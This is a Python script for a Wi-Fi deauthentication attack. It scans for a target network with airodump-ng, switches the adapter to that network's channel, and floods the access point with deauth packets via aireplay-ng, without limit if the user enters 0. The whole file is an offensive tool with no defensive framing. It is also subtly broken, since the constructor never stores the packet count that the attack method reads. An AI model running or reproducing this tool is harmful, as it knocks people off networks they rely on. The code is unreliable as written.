import subprocess
import time
import re

class Deauther:
    def __init__(self, target: str, iface: str,amount: int):
        self.target = target
        self.iface = iface
        self.bssid = None
        self.channel = None

    def get_bssid_and_channel(self):
        print(f"[+] Scanning for {self.target}...")
        cmd = ["sudo", "airodump-ng", self.iface, "--essid", self.target]

        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

        time.sleep(10)  # Allow some time for scanning
        process.terminate()  # Stop scan

        try:
            output, _ = process.communicate(timeout=3)  # Collect output safely
        except subprocess.TimeoutExpired:
            process.kill()
            print("[!] Process did not terminate properly.")
            return False
        
        print("Output fetched.")

        # Extract BSSID and channel from output
        match = re.search(r"([\w:]{17})\s+[-\d]+\s+\d+\s+\d+\s+\d+\s+(\d+)", output)
        if match:
            self.bssid, self.channel = match.groups()
            print(f"[+] Found BSSID: {self.bssid}, Channel: {self.channel}")
            return True
        else:
            print(f"[!] Could not determine BSSID or channel for SSID: {self.target}")
            return False


    def change_channel(self):
        """ Set Wi-Fi adapter to correct channel """
        if self.channel:
            print(f"[+] Changing to channel {self.channel}")
            subprocess.run(["iwconfig", self.iface, "channel", self.channel], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            print("[!] No channel found, skipping channel change.")

    def deauth_attack(self):
        """ Performs the deauth attack """
        if not self.bssid:
            if not self.get_bssid_and_channel():
                print("[!] Cannot proceed. Missing BSSID or channel.")
                return

        self.change_channel()
        print(f"\n[+] Sending {self.packets} deauth packets to {self.bssid} via {self.iface} on channel {self.channel}\n")

        cmd = ["aireplay-ng", "--deauth", str(self.packets), "-a", self.bssid, self.iface]
        subprocess.run(cmd)

if __name__ == "__main__":
    target = input("Enter target BSSID or SSID (e.g., Galaxy A7 (2018)): ")
    iface = input("Enter monitor mode interface (e.g., wlan1): ")
    packets = int(input("Enter number of deauth packets (0 = infinite): "))

    deauther = Deauther(target, iface, packets)
    deauther.deauth_attack()
